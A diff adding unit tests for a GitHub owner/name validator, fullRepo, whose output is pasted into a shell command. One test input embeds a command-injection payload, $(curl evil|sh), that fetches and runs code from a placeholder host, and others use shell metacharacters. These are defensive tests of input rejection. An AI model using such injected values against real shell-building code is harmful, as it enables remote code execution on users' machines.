@@ -56,4 +56,17 @@ describe('fullRepo', () => {
     expect(fullRepo('/name')).toBeNull()
     expect(fullRepo('owner/')).toBeNull()
   })
+
+  it('keeps dots, underscores and digits in the name', () => {
+    expect(fullRepo('nicolovejoy/my.repo_name-2')).toBe('nicolovejoy/my.repo_name-2')
+  })
+
+  // The result is pasted into a shell line on the Setup tab, so anything GitHub
+  // would not allow in an owner/name pair must come back null.
+  it('returns null for characters GitHub does not allow', () => {
+    expect(fullRepo('x/y\'"$(curl evil|sh)"\'')).toBeNull()
+    for (const bad of ['a b/c', 'a/b c', 'a/b"c', "a/b'c", 'a/$b', 'a/b;c', 'a/b`c', 'a_b/c']) {
+      expect(fullRepo(bad), bad).toBeNull()
+    }
+  })
 })
